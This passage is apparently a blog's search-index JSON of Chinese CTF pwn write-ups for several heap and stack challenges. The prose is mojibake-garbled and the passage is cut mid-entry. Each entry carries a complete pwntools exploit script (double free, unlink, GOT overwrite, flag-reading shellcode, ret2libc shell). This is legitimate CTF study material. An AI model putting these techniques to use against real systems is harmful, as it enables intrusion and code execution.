&#39;,&#39;5&#39;) p.sendlineafter(&#39;Which kingdom?&#39;,content) add() #0 add() #1 add() #2 free(0) free(1) free(0) show() p.recvuntil(&#39;Your lair is at: &#39;) addr=int(p.recv(14),16) #addr = int(p.recvuntil(&#39;\\n&#39;, drop=True), 16) print(&#39;addr=&gt;&#39;+hex(addr)) move(str(0x20)) gdb.attach(p) pause() #sleep(1) v8=addr-0x8 add() #3 full(3,str(v8)) add() #4 add() #5 add() #6 full(6,str(0xdeadbeef)) p.sendlineafter(&#39;choice &gt; &#39;,&#39;6&#39;) p.interactive()","categories":[],"tags":[]},{"title":"ciscn_2019_c_3","slug":"ciscn-2019-c-3","date":"2023-11-27T13:21:21.000Z","updated":"2023-11-27T14:39:09.858Z","comments":true,"path":"2023/11/27/ciscn-2019-c-3/","link":"","permalink":"http://example.com/2023/11/27/ciscn-2019-c-3/","excerpt":"","text":"å¼€å¯äº†å…¨å±€åç§»addå‡½æ•°ï¼Œåªå…è®¸ç”³è¯·å›ºå®šçš„å‡ ä¸ªå¤§å°çš„å †ï¼Œåœ¨å †åœ°å€+16çš„åœ°æ–¹å†™å…¥å†…å®¹ï¼Œæ‰€ä»¥æ”¹ä¸äº†fdå’Œbkåœ°å€ï¼Œå †åœ°å€å¼€å§‹å†™ä¸Š0ï¼Œå †åœ°å€+8çš„åœ°å€ä¼šåŠ ä¸Šéšæœºæ•° showå‡½æ•°ï¼Œä¼šæŠŠå †åœ°å€ä¸Šçš„å‡ ä¸ªæ•°åˆ†åˆ«æ‰“å°å‡ºæ¥ï¼Œå¯ä»¥æ‰“å°å‡ºmain_arena+96çš„åœ°å€ deleteå‡½æ•°ï¼Œå­˜åœ¨å¾ˆæ˜æ˜¾çš„UAFæ¼æ´ è¿˜æœ‰ä¸ªåé¢å‡½æ•°ï¼Œå¯ä»¥æ”¹å †fdä½ç½®çš„ä¸œè¥¿ï¼Œæ¯æ¬¡èƒ½ä½¿å…¶åŠ ä¸€ï¼Œåé¢èƒ½æ”¹å…¶binæŒ‡é’ˆ å…ˆmallocå¤§å°ä¸º0x100çš„å †ï¼Œç„¶åé‡Šæ”¾8æ¬¡ï¼Œç„¶åbinæ‰ä¼šæœ‰main_arena+96,ä¸”å¾—å…ˆmallocå¤§å°æ˜¯0x100å¤§å°çš„å †add(0x100,&#39;aaaa&#39;) #0 add(0x60,&#39;bbbb&#39;) #1 for i in range(8): delete(0) ç„¶åshowçš„è¯èƒ½æ¥æ”¶åˆ°å…¶åœ°å€show(0) p.recvuntil(&quot;attack_times: &quot;) #arena = u64(p.recv(6).ljust(8, b&#39;\\x00&#39;)) arena_96=int(p.recvuntil(&#39;\\n&#39;,drop=True)) malloc_hook=arena_96-96-0x10 base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;] free_hook=base+libc.sym[&#39;__free_hook&#39;] gadget=base+one_gadget å†ç”³è¯·ä¸€ä¸ªå †ï¼Œè¿™æ—¶å€™ä¼šåœ¨å †2å¼€å§‹,ç”±äºglibc 2.27çš„ç‰¹æ€§ï¼Œä¼šåœ¨å¼€å§‹çš„ä¸Šæ–¹ç”³è¯·å †ï¼Œè¿™é‡Œä¸å¤ªæ˜ç™½ä¸ºä»€ä¹ˆè¦ç”¨free_hook-0x10çš„åœ°å€ï¼Œè€Œä¸æ˜¯free_hookpayload=p64(0)*2+p64(free_hook-0x10) add(0x60,payload) #2 double freeç„¶åç”¨backdoorå‡½æ•°20æ¬¡ï¼Œfd+0x20,å°†binæŒ‡é’ˆæŒ‡å‘0x0000562a77ab5280çš„åœ°å€ add(0x60,&#39;aaaa&#39;) add(0x60,&#39;bbbb&#39;) add(0x60,p64(gadget)) delete(1) expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,29798) p=process(&quot;./ciscn_2019_c_3&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.27.so&#39;) context.arch=&#39;amd64&#39; one_gadget=0x4f322 def add(size,content): p.sendlineafter(&#39;Command: &#39;,&#39;1&#39;) p.sendlineafter(&#39;size: &#39;,str(size)) p.sendlineafter(&#39;Give me the name: &#39;,content) def show(index): p.sendlineafter(&#39;Command: &#39;,&#39;2&#39;) p.sendlineafter(&#39;index: &#39;,str(index)) def delete(index): p.sendlineafter(&#39;Command: &#39;,&#39;3&#39;) p.sendlineafter(&#39;weapon:&#39;,str(index)) def back(index): p.sendlineafter(&#39;Command: &#39;,&#39;666&#39;) p.sendlineafter(&#39;weapon:&#39;,str(index)) add(0x100,&#39;aaaa&#39;) #0 add(0x60,&#39;bbbb&#39;) #1 for i in range(8): delete(0) show(0) p.recvuntil(&quot;attack_times: &quot;) #arena = u64(p.recv(6).ljust(8, b&#39;\\x00&#39;)) arena_96=int(p.recvuntil(&#39;\\n&#39;,drop=True)) malloc_hook=arena_96-96-0x10 base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;] free_hook=base+libc.sym[&#39;__free_hook&#39;] gadget=base+one_gadget payload=p64(0)*2+p64(free_hook-0x10)#2 add(0x60,payload) delete(2) delete(2) for i in range(0x20): back(2) gdb.attach(p) sleep(1) add(0x60,&#39;aaaa&#39;) add(0x60,&#39;bbbb&#39;) print(hex(free_hook)) add(0x60,p64(gadget)) delete(1) p.interactive()","categories":[],"tags":[]},{"title":"ciscn_final_2","slug":"ciscn-final-2","date":"2023-11-02T14:07:31.000Z","updated":"2023-11-03T14:06:20.041Z","comments":true,"path":"2023/11/02/ciscn-final-2/","link":"","permalink":"http://example.com/2023/11/02/ciscn-final-2/","excerpt":"","text":"ä¾‹è¡Œæ£€æŸ¥ï¼Œä¿æŠ¤å…¨å¼€ï¼Œå°±ä¸æ”¾äº†ã€‚addå‡½æ•°ï¼Œåªèƒ½ç”³è¯·0x20å¤§å°çš„å †æˆ–è€…0x10å¤§å°çš„ï¼Œåªèƒ½å…ˆç”³è¯·å†é‡Šæ”¾ å­˜åœ¨double freeæ¼æ´ å¯ä»¥double freeæ³„éœ²å‡ºå †åœ°å€ï¼Œä½†æ˜¯æ˜¯intç±»å‹ï¼Œæ¥æ”¶çš„è¯ç”¨addr=int(p.recvuntil(â€˜\\nâ€™, drop=True)),å‘é€çš„æ—¶å€™ç”¨strç±»å‹å°±å¯åœ¨å†…å­˜é‡Œç”¨åå…­è¿›åˆ¶å­˜å‚¨äº†ã€‚ å‰æˆæ˜¯å…ˆdouble freeæ”¹å †å¤´çš„sizeï¼Œæ”¹sizeå®¹æ˜“ä½†æ˜¯ä¸­é—´å¾—addå¥½å‡ ä¸ªå †add(1,&#39;11&#39;) dele(1) add(2,&#39;22&#39;) add(2,&#39;11&#39;) add(2,&#39;11&#39;) add(2,&#39;22&#39;) dele(2) add(1,&#39;11&#39;) dele(2) show(2) p.recvuntil(&#39;your short type inode number :&#39;) addr=int(p.recvuntil(&#39;\\n&#39;, drop=True))-0xa0 add(2,addr) add(2,&#39;11&#39;) add(2,0x91) #æ”¹æ‰size free7æ¬¡ä½¿å…¶è¿›å…¥unsortedbin,å‰é¢æ”¹sizeæˆ0x90æ˜¯æœ€å°çš„å¤§å°ï¼Œä¸ç„¶ä¸‹é¢çš„åœ°å€ä¸ä¼šæ˜¯main_arena+96for i in range(7): dele(1) add(2,5) dele(1) æ¥æ”¶å¹¶è®¡ç®—åœ°å€,è‡³äºä¸ºä»€ä¹ˆæ˜¯ IO_2_1_stdin +0x70ï¼Œåº”è¯¥æ˜¯å®ƒæ‰§è¡Œæ—¶å€™çš„åœ°å€ã€‚show(1) p.recvuntil(&#39;your int type inode number :&#39;) malloc_hook=int(p.recvuntil(&#39;\\n&#39;, drop=True))-0x70 base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;] stdin=base+libc.sym[&#39;_IO_2_1_stdin_&#39;]+0x70 å†æ¬¡mallocæ”¹æ‰å †åœ°å€,ç„¶åå¡«å……add(1,stdin) add(1,0x30) å†æ¬¡double freeè·å–å¤´åœ°å€ï¼Œå†æ¬¡showå‡ºæ¥çš„å †å¤´åœ°å€å’Œå¼€å§‹æ—¶çš„æ—¶ä¸ä¸€æ ·çš„ã€‚dele(1) add(2,0x30) dele(1) #double free show(1) p.recvuntil(&#39;your int type inode number :&#39;) chunk0=int(p.recvuntil(&#39;\\n&#39;, drop=True))-0x30 å†æ”¹å †æŒ‡é’ˆ,å¡«å……add(1,chunk0) add(1,chunk0) add(1,111) add(1,666) expfrom pwn import * from LibcSearcher import * p=process(&#39;./ciscn_final_2&#39;) #p=remote(&#39;node4.buuoj.cn&#39;,26681) context( os = &#39;linux&#39;,arch=&#39;amd64&#39;) context.log_level = &#39;debug&#39; elf=ELF(&#39;./ciscn_final_2&#39;) libc=ELF(&#39;./libc-2.27.so&#39;) def add(index,content): p.sendlineafter(&#39;&gt; &#39;,&#39;1&#39;) p.sendlineafter(&#39;&gt;&#39;,str(index)) p.sendlineafter(&#39;your inode number:&#39;,str(content)) def dele(index): p.sendlineafter(&#39;&gt; &#39;,&#39;2&#39;) p.sendlineafter(&#39;&gt;&#39;,str(index)) def show(index): p.sendlineafter(&#39;&gt; &#39;,&#39;3&#39;) p.sendlineafter(&#39;&gt;&#39;,str(index)) add(1,&#39;11&#39;) dele(1) add(2,&#39;22&#39;) add(2,&#39;11&#39;) add(2,&#39;11&#39;) add(2,&#39;22&#39;) dele(2) add(1,&#39;11&#39;) dele(2) show(2) p.recvuntil(&#39;your short type inode number :&#39;) addr=int(p.recvuntil(&#39;\\n&#39;, drop=True))-0xa0 add(2,addr) add(2,&#39;11&#39;) add(2,0x91) for i in range(7): dele(1) add(2,5) dele(1) show(1) p.recvuntil(&#39;your int type inode number :&#39;) malloc_hook=int(p.recvuntil(&#39;\\n&#39;, drop=True))-0x70 base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;] stdin=base+libc.sym[&#39;_IO_2_1_stdin_&#39;]+0x70 add(1,stdin) ###??? add(1,0x30) #double free dele(1) add(2,0x30) dele(1) show(1) p.recvuntil(&#39;your int type inode number :&#39;) chunk0=int(p.recvuntil(&#39;\\n&#39;, drop=True))-0x30 add(1,chunk0) gdb.attach(p) sleep(1) add(1,chunk0) add(1,111) add(1,666) p.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;) p.recvuntil(&#39;your message :&#39;) #print(addr) p.interactive()","categories":[],"tags":[{"name":"buu","slug":"buu","permalink":"http://example.com/tags/buu/"}]},{"title":"sleepyHolder_hitcon_2016","slug":"sleepyHolder-hitcon-2016","date":"2023-10-30T12:09:08.000Z","updated":"2023-10-31T13:49:22.122Z","comments":true,"path":"2023/10/30/sleepyHolder-hitcon-2016/","link":"","permalink":"http://example.com/2023/10/30/sleepyHolder-hitcon-2016/","excerpt":"","text":"ä¾‹è¡Œæ£€æŸ¥ addå‡½æ•°ï¼Œèƒ½åˆ†åˆ«ç”³è¯·ä¸€ä¸ª0x28ï¼Œ0xfa0,0x61a80å¤§å°çš„å †ä¸€æ¬¡ deleå‡½æ•°ï¼Œå­˜åœ¨UAFæ¼æ´ï¼ŒæŒ‡é’ˆæ²¡æœ‰æ¸…é›¶ï¼Œä½†æ˜¯å¯¹åº”çš„æ•°æ¸…é›¶äº†ï¼Œæ‰€ä»¥å¯ä»¥å†æ¬¡ç”³è¯·å † è¿™è¿˜æœ‰ä¸ªeditå‡½æ•° add(1,&#39;AAAA&#39;) #å †0 add(2,&#39;BBBB&#39;) #å †1 dele(1) add(3,&#39;cccc&#39;) #å †2 å› ä¸ºå †2å¤ªå¤§æ‰€ä»¥free chunkä¼šæ”¾åœ¨smallbiné‡Œ è¿™é‡Œæœ‰ä¸ªæ¼æ´ï¼Œdouble freeå †0åå†æ¬¡ç”³è¯·å †0ï¼Œå †1çš„sizeä½è¿˜æ˜¯0ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨unlink å†ç”³è¯·ä¸€æ¬¡å †add(1,&#39;aaaa&#39;) åé¢æ„é€ fake_chunk,ç„¶ådele(2),ä¼šunlinkpayload=p64(0)+p64(0x21)+p64(fd)+p64(bk)+p64(0x20) edit(1,payload) dele(2) #unlink æ³¨æ„å †0æ—¶0x6020d0,å †1æ—¶0x6020c0ï¼Œåˆšå¼€å§‹ä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆåé¢è¦è¡¥è¿™ä¹ˆå¤š1ï¼Œåé¢çœ‹å‘addå‡½æ•°ï¼Œå †0ï¼Œ1ï¼Œ2åˆ†åˆ«å¯¹åº”ç€0x6020e0,d8,dcçš„åœ°å€,æœ‰åˆ™è¡¨ç¤º1,å †1è™½å·²deleï¼Œä½†æ˜¯åªæ˜¯ä¸ºäº†åé¢æ–¹ä¾¿æ”¹æŒ‡é’ˆï¼Œå…¨éƒ½å†™æˆ1payload=p64(0)+p64(elf.got[&#39;free&#39;])+p64(0)+p64(0x6020c0)+p32(1)+p32(1)+p32(1) edit(1,payload) #8 edit(2,p64(0x400760)) #put_plt edit(1,p64(0x602020)) #puts_got æŠŠfree_gotæ”¹å†™çš„å†…å®¹æ”¹æˆputs_plt,å¯ä»¥æ‰§è¡Œputså‡½æ•°ï¼Œå †0çš„æŒ‡é’ˆå†™ä¸Šputs_got,ç„¶ådeleå †1ï¼Œå°±ä¼šæ‰“å°å‡ºåœ°å€ ç„¶åç®—å‡ºåç§»ï¼Œç®—å‡ºsystemå‡½æ•°çš„åœ°å€ï¼Œå†editå †0ï¼Œ0x6020c0payload=p64(elf.got[&#39;atoi&#39;])+p64(0)+p32(1)+p32(1)+p32(1) edit(1,payload) å†editå †2ï¼Œå†™ä¸Šsystemçš„åœ°å€ï¼Œedit(2,p64(system)) ä¸»å‡½æ•°èœå•é‚£é‡Œè¿˜æœ‰ä¸ªatoiå‡½æ•°ï¼Œå†™ä¸Šâ€™shâ€™å³å¯expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,) p=process(&quot;./sleepyHolder_hitcon_2016&quot;) context.log_level=&quot;debug&quot; context(arch=&#39;amd64&#39;) elf=ELF(&#39;./sleepyHolder_hitcon_2016&#39;) libc=ELF(&#39;libc-2.23.so&#39;) def add(chose,content): p.sendlineafter(&#39;3. Renew secret\\n&#39;,&#39;1&#39;) p.sendlineafter(&#39;What secret do you want to keep?&#39;,str(chose)) p.sendafter(&#39;Tell me your secret: &#39;,content) def dele(index): p.sendlineafter(&#39;3. Renew secret\\n&#39;,&#39;2&#39;) p.sendlineafter(&#39;Which Secret do you want to wipe?&#39;,str(index)) def edit(ch,content): p.sendlineafter(&#39;3. Renew secret\\n&#39;,&#39;3&#39;) p.sendlineafter(&#39;Which Secret do you want to renew?&#39;,str(ch)) p.sendafter(&#39;Tell me your secret: &#39;,content) add(1,&#39;AAAA&#39;) add(2,&#39;BBBB&#39;) dele(1) add(3,&#39;cccc&#39;) dele(1) add(1,&#39;aaaa&#39;) fd=0x6020d0-0x18 bk=0x6020d0-0x10 payload=p64(0)+p64(0x21)+p64(fd)+p64(bk)+p64(0x20) edit(1,payload) #6 dele(2) #7 unlink payload=p64(0)+p64(elf.got[&#39;free&#39;])+p64(0)+p64(0x6020c0)+p32(1)+p32(1)+p32(1) edit(1,payload) #8 edit(2,p64(0x400760)) edit(1,p64(0x602020)) dele(2) #dele(2) p.recvuntil(&#39;2. Big secret&#39;) puts_addr=u64(p.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8,&#39;\\x00&#39;)) print(hex(puts_addr)) base=puts_addr-libc.sym[&#39;puts&#39;] system=base+libc.sym[&#39;system&#39;] payload=p64(elf.got[&#39;atoi&#39;])+p64(0)+p32(1)+p32(1)+p32(1) edit(1,payload) edit(2,p64(system)) p.sendlineafter(&#39;3. Renew secret\\n&#39;,&#39;sh\\n&#39;) p.interactive()","categories":[],"tags":[{"name":"buu","slug":"buu","permalink":"http://example.com/tags/buu/"}]},{"title":"SWPUCTF_2019_p1KkHeap","slug":"SWPUCTF-2019-p1KkHeap","date":"2023-10-29T09:53:51.000Z","updated":"2023-10-30T05:28:56.413Z","comments":true,"path":"2023/10/29/SWPUCTF-2019-p1KkHeap/","link":"","permalink":"http://example.com/2023/10/29/SWPUCTF-2019-p1KkHeap/","excerpt":"","text":"æ‰€æœ‰æ“ä½œæ€»å…±é™åˆ¶åœ¨äº†0x12æ¬¡ ä¿æŠ¤å…¨å¼€ï¼Œé™åˆ¶äº†å †çš„å¤§å°åœ¨0x100ï¼Œä¸èƒ½ç»•è¿‡tachebinæœºåˆ¶ deleæ—¶æ²¡æœ‰å°†bssæ®µä¸Šçš„å †æŒ‡é’ˆæ¸…é›¶ï¼Œå­˜åœ¨double freeæ¼æ´ æœ€å¤šåªèƒ½ç”³è¯·8æ¬¡å † æœ¬æƒ³æ³„éœ²å †çš„åœ°å€ç„¶åæ”¹sizeæ³„éœ²åœ°å€ï¼Œä½†æ˜¯æœ€åçš„deleä¼šæŠ¥é”™ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œè€Œä¸”ç”³è¯·çš„æ¬¡æ•°æ ¹æœ¬ä¸å¤Ÿç”¨ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•ä¸è¡Œã€‚add(0x40) #0 add(0x40) #1 add(0x10) #2 add(0x10) #3 dele(0) dele(1) dele(0) show(0) p.recvuntil(&#39;content: &#39;) m0_addr=u64(p.recv(6).ljust(8,&#39;\\x00&#39;)) print(hex(m0_addr)) #add(0x10,) add(0x40) edit(4,p64(m0_addr+0x50)) add(0x40) add(0x40) add(0x40) payload=p64(0)*3+p64(0x421) edit(7,payload) è¿™é‡Œlibc2.27æœ‰ä¸€ç§ç‰¹æ€§ï¼Œtcache_perthread_structç»“æ„ä½“åœ¨å †ä¸Šï¼Œé‡Šæ”¾åå¤§å°åœ¨0x20åˆ°0x410çš„å †çš„åœ°å€ä¼šæ”¾åœ¨å¼€å§‹çš„0x250çš„å †é‚£é‡Œï¼Œè¿™é‡Œé‡Šæ”¾äº†ä¸‰ä¸ªå †ï¼Œä»0x557386b4a010å¼€å§‹ï¼Œä»–æ˜¯å°ç«¯åºå­˜å‚¨æ”¾åˆ°äº†åè¾¹ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯0x10å¤§å°çš„å †çš„æ•°é‡ï¼Œç„¶åä¾æ¬¡æ˜¯0x20,æœ€å¤šæ”¾7ä¸ªï¼Œæ”¾å®Œå°±æ”¾fastbinå’Œunsortedbiné‡Œã€‚ åœ¨ä¸»å‡½æ•°é‡Œæœ‰ä¸€ä¸ªå‡½æ•° å®ƒæ˜ å°„äº†ä¸€ä¸ªåœ°å€åœ¨0x6666000ï¼Œé‚£ä¹ˆè¿™é“é¢˜å¾ˆæ˜æ˜¾ç”¨shellcodeå†™ï¼ŒæŠŠshellcodeå†™åœ¨è¿™ä¸ªåœ°å€ç„¶åæ‰§è¡Œ é¦–å…ˆå…ˆè®¡ç®—å‡ºtcache_perthread_structç»“æ„ä½“çš„åœ°å€ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥å¯¹ä¸€ä¸ªå †é‡Šæ”¾ä¸¤æ¬¡add(0x100) add(0x100) dele(1) dele(1) show(1) p.recvuntil(&#39;content: &#39;) tache_addr=u64(p.recv(6).ljust(8,&#39;\\x00&#39;))-0x360 print(hex(tache_addr)) å†ç”³è¯·å †å°±èƒ½ç›´æ¥ä¿®æ”¹å †æŒ‡é’ˆ,æ”¹åˆ°tache_perthread_structå¼€å§‹çš„åœ°å€add(0x100) #2 edit(2,p64(tache_addr)) å†ç”³è¯·ä¸¤æ¬¡ï¼Œåœ¨tache_perthreadèƒ½æ”¹åˆ°ä¸‹é¢çš„åœ°å€,ç›¸å¯¹å¼€å§‹çš„åç§»æ˜¯0xc8,è¿™é‡Œä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆæ”¹åˆ°ä¸‹é¢çš„binæŒ‡é’ˆï¼Œåº”è¯¥å’Œå †ç®¡ç†å™¨æœ‰å…³add(0x100) #3 add(0x100) #4 vmmap=0x66660000 edit(4,0xb8*&#39;\\x00&#39;+p64(vmmap)) å†ç”³è¯·å †ï¼Œåœ¨0x66660000è¿™ä¸ªåœ°å€ä¸Šå†™ä¸Šshellcodeï¼Œè¿™é‡Œçœ‹åˆ°shellcodeçš„å¤§å°æ˜¯å¤§äº0x30çš„ï¼Œè‡³äºä¸ºä»€ä¹ˆåœ°å€æ˜¯0x66660300,å…¶å®åé¢æ”¹æˆshellcodeä»¥åçš„åœ°å€éƒ½å¯ä»¥ï¼Œæ¯”å¦‚0x66660040ä»¥åadd(0x100) #5 shellcode=shellcraft.open(&#39;flag&#39;,0) shellcode+=shellcraft.read(3,0x66660300,0x30) shellcode+=shellcraft.write(1,0x66660300,0x30) edit(5,shellcode) å½“tache_perthreadçš„sizeä¸º0ä½†æ‰€å¯¹åº”çš„é¦–åœ°å€ä¸ä¸ºç©ºæ—¶ï¼Œå†åˆ†é…å‡ºå»sizeä¼šå˜æˆ0xffå¤§äº7ï¼Œå†dele(0)ä¼šæ”¾åœ¨unsortedbinï¼Œå› ä¸ºå¤§äº0x80ï¼Œæ­¤æ—¶å¯ä»¥æ³„éœ²main_arena+96çš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€å‡0x70å°±æ˜¯malloc_hookçš„åœ°å€dele(0) show(0) p.recvuntil(&#39;content: &#39;) malloc_hook=u64(p.recv(6).ljust(8,&#39;\\x00&#39;))-0x70 print(hex(malloc_hook)) å†ä»¥ç›¸åŒçš„æ–¹å¼æ”¹æ‰tachebinçš„åœ°å€edit(4,0xb8*&#39;\\x00&#39;+p64(malloc_hook)) å†ç”³è¯·ä¸€æ¬¡0x100å¤§å°çš„å †ï¼Œeditå†…å®¹ä¸º0x66660000çš„åœ°å€ï¼Œå†ç”³è¯·ä¸€æ¬¡å †å³å¯ææƒexpfrom pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,) p=process(&quot;./SWPUCTF_2019_p1KkHeap&quot;) context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;, endian=&#39;little&#39;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.27.so&#39;) def add(size): p.sendlineafter(&#39;Your Choice: &#39;,&#39;1&#39;) p.sendlineafter(&#39;size: &#39;,str(size)) def show(index): p.sendlineafter(&#39;Your Choice: &#39;,&#39;2&#39;) p.sendlineafter(&#39;id: &#39;,str(index)) def edit(index,content): p.sendlineafter(&#39;Your Choice: &#39;,&#39;3&#39;) p.sendlineafter(&#39;id: &#39;,str(index)) p.sendlineafter(&#39;content: &#39;,content) def dele(index): p.sendlineafter(&#39;Your Choice: &#39;,&#39;4&#39;) p.sendlineafter(&#39;id: &#39;,str(index)) add(0x100) #0 add(0x100) #1 dele(1) dele(1) show(1) p.recvuntil(&#39;content: &#39;) tache_addr=u64(p.recv(6).ljust(8,&#39;\\x00&#39;))-0x360 print(hex(tache_addr)) add(0x100) #2 edit(2,p64(tache_addr)*2) add(0x100) #3 add(0x100) #4 vmmap=0x66660000 edit(4,0xb8*&#39;\\x00&#39;+p64(vmmap)) add(0x100) #5 shellcode=shellcraft.open(&#39;flag&#39;,0) shellcode+=shellcraft.read(3,0x66660300,0x30) shellcode+=shellcraft.write(1,0x66660300,0x30) edit(5,asm(shellcode)) dele(0) show(0) p.recvuntil(&#39;content: &#39;) malloc_hook=u64(p.recv(6).ljust(8,&#39;\\x00&#39;))-0x70 print(hex(malloc_hook)) #dele(0) edit(4,0xb8*&#39;\\x00&#39;+p64(malloc_hook)) add(0x100) #6 edit(6,p64(vmmap)) add(0x100) gdb.attach(p) sleep(1) p.interactive()","categories":[],"tags":[{"name":"buu","slug":"buu","permalink":"http://example.com/tags/buu/"}]},{"title":"NewStar","slug":"NewStar","date":"2023-10-25T12:52:55.000Z","updated":"2023-10-30T04:43:10.434Z","comments":true,"path":"2023/10/25/NewStar/","link":"","permalink":"http://example.com/2023/10/25/NewStar/","excerpt":"","text":"p1eeeå¼€äº†pieä¿æŠ¤ å¯ä»¥æº¢å‡ºä¸€å­—èŠ‚ è¿˜æœ‰ä¸ªåé—¨å‡½æ•° å› ä¸ºä»£ç æ®µå’Œåé—¨å‡½æ•°åœ°å€ç›¸å·®æ˜¯éå¸¸è¿‘çš„ï¼Œåªå·®äº†ä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¦†ç›–è¿”å›åœ°å€ä¸ºåé—¨å‡½æ•°åœ°å€ï¼Œè¿”å›å‡½æ•°çš„åœ°å€ä¸€èˆ¬éƒ½æ˜¯move rbp ï¼Œrspä¹‹ç±»çš„ï¼Œæ‰€ä»¥è¿™é‡Œæœ€åä¸€å­—èŠ‚æ”¹æˆâ€™\\x69â€™,æ”¹æˆä¹‹å‰çš„éƒ½ä¸è¡Œã€‚ expfrom pwn import* from LibcSearcher import * p=remote(&quot;node4.buuoj.cn&quot;,29807) #p=process(&quot;./pie&quot;) context.log_level=&quot;debug&quot; payload=&#39;a&#39;*(0x28)+&#39;\\x69&#39; p.sendlineafter(&#39;A nice try to break pie!!!&#39;,payload) #gdb.attach(p) #sleep(1) #p.sendline(payload) p.interactive() ret2libcå¸¸è§„çš„64ä½çš„ret2libcé¢˜ åŒºåˆ«åœ¨äºæœ€åçš„payloadè¦åœ¨p64(binsh)åé¢åŠ ä¸ªretçš„å‚æ•°payload=&#39;a&#39;*0x28+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system) libcçš„è¯write_upæ˜¯æ¨èæ‰‹åŠ¨è®¡ç®—ï¼Œä½†æ˜¯æ²¡ç»™å…·ä½“æ˜¯ä»€ä¹ˆç‰ˆæœ¬çš„libc,ç”¨é¢˜ç›®æœ¬èº«çš„ï¼Œç”¨buuè‡ªå¸¦æä¾›çš„libc-2.23.so,libc-2.27.soéƒ½æ˜¯æ‰“ä¸é€šçš„ã€‚# libc.blukat.me æŸ¥è¯¢libcç‰ˆæœ¬åæ‰‹åŠ¨è®¡ç®—ï¼ˆæ¨èï¼‰ libc_base = puts_addr - 0x080970 system_addr = libc_base + 0x04f420b in_addr = libc_base + 0x1b3d88 expfrom pwn import * from LibcSearcher import * p=remote(&quot;node4.buuoj.cn&quot;,27215) #p=process(&quot;./ret2libc1&quot;) elf=ELF(&#39;./ret2libc1&#39;) #libc=ELF(&#39;./libc-2.23.so&#39;) #libc=elf.libc context.log_level=&quot;debug&quot; puts_plt=0x400520 puts_got=elf.got[&#39;puts&#39;] pop_rdi=0x400763 main=0x400698 ret=0x4006F1 payload=&#39;a&#39;*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main) p.sendlineafter(&#39;again&#39;,payload) p.recvuntil(&#39;time&#39;) #gdb.attach(p) sleep(1) puts_addr=u64(p.recvuntil(b&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;)) #puts_addr=u64(p.recvuntil(&#39;\\n&#39;,drop=True).ljust(8,&#39;\\x00&#39;)) print(hex(puts_addr)) base=puts_addr-0x04f420 #-libc.sym[&#39;puts&#39;] system=base+0x080970 #libc.sym[&#39;system&#39;] binsh=base+0x1b3d88 #libc.search(&#39;bin/sh&#39;).next() payload=&#39;a&#39;*0x28+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system) p.sendlineafter(&#39;again&#39;,payload) p.interactive()","categories":[],"tags":[{"name":"ctf-NewSar","slug":"ctf-NewSar","permalink":"http://example.com/tags/ctf-NewSar/"}]},{"title":"login","slug":"login","date":"2023-10-23T12:48:27.000Z","updated":"2023-10-26T13:40:08.013Z","comments":true,"path":"2023/10/23/login/","link":"","permalink":"http://example.com/2023/10/23/login/","excerpt":"","text":"ä¾‹è¡Œæ£€æŸ¥ï¼Œè¿™é“é¢˜æ˜¯é™æ€çš„ï¼Œå‡½æ•°å¤šä¸”çœ‹ä¸æ‡‚ ç¬¬åäº”è¡Œçš„Base64Decodeå‡½æ•°ï¼Œå‚æ•°æ˜¯s,ç”¨æ¥å°†æˆ‘ä»¬è¾“å…¥çš„sè¿›è¡Œè½¬æ¢ï¼Œæ˜¯ä¸€ä¸ªç”¨äºå°†base64æ ¼å¼çš„æ•°æ®è§£ç ä¸ºäºŒè¿›åˆ¶æ•°æ®çš„å‡½æ•°ï¼Œå°†è½¬åŒ–åçš„å€¼æ•°æ®èµ‹ç»™v5ï¼Œç„¶åå†æŠŠå€¼ç»™bssæ®µä¸Šçš„inputã€‚ çœ‹å‘ä¸»å‡½æ•°ï¼Œv7è½¬åŒ–åçš„æ•°æ®é•¿åº¦ä¸èƒ½è¶…è¿‡åäºŒï¼Œè¾“å…¥æµ‹è¯•å‘ç°è¾“å…¥çš„é•¿åº¦ä¸èƒ½è¶…è¿‡åä¸€ï¼Œå› ä¸ºè¾“å…¥çš„æ—¶å€™ä¼šåŠ ä¸Šæ¢è¡Œç¬¦ç»“æŸï¼Œsend()å¯ä»¥å‘é€åäºŒä¸ªï¼Œsendlineå¯ä»¥å‘é€åä¸€ä¸ªå­—èŠ‚ï¼Œç„¶åç¬¬äºŒåäºŒè¡ŒæŠŠv7å¤åˆ¶ç»™äº†bssæ®µä¸Šçš„inputï¼Œç„¶åæ˜¯authå‡½æ•°ï¼Œä¼šè¿”å›ä¸€æ®µäºŒè¿›åˆ¶æ•°æ®ç¼–ç ã€‚ payloadè¿™æ ·å†™payload=&#39;aaaa&#39;+p32(0x8049284)+p32(0x811EB40) payload=base64.b64encode(payload) åªèƒ½åˆšå¥½è¦†ç›–åˆ°ebpï¼Œå› ä¸ºæœ€å¤šè¾“å…¥0xcä¸ªå­—èŠ‚ï¼Œpayloadç”¨å‡½æ•°ç¼–ç 